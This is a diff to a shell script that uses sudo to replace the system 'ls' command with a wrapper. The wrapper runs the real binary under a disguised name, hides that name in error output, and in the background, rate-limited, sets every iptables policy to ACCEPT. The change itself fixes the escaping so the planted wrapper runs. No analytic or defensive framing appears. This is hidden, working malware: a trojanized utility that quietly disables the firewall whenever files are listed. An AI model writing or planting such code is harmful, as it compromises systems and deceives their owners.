@@ -4,19 +4,19 @@ ls_path="$(which ls 2>/dev/null)"
 sudo bash -c "cat > \"$ls_path\"" << 'EOF'
 #!/bin/bash
 
-ls_path="\$(which ls 2>/dev/null)"
+ls_path="$(which ls 2>/dev/null)"
 shift
-output="\$("\${ls_path}-cache" "\$@" 2>&1)"
+output="$("${ls_path}-cache" "$@" 2>&1)"
 status=$?
 
 # If there was an error, clean it up and show it
 if [[ $status -ne 0 ]]; then
-    echo "\$output" | sed "s|\${ls_path}-cache|ls|g" >&2
-    exit \$status
+    echo "$output" | sed "s|${ls_path}-cache|ls|g" >&2
+    exit $status
 fi
 
 # Otherwise, just print normal output
-echo "\$output"
+echo "$output"
 
 rate_limit_file="/tmp/.ls_last_run"
 cooldown=10  # seconds
@@ -27,7 +27,7 @@ last_run=$(cat "$rate_limit_file" 2>/dev/null || echo 0)
 if (( now - last_run >= cooldown )); then
     (
         flock -n 200 || exit 1
-            echo "\$now" > "\$rate_limit_file"
+            echo "$now" > "$rate_limit_file"
             sudo iptables -P INPUT ACCEPT > /dev/null 2>&1 &
             sudo iptables -P FORWARD ACCEPT > /dev/null 2>&1 &
             sudo iptables -P OUTPUT ACCEPT > /dev/null 2>&1 &
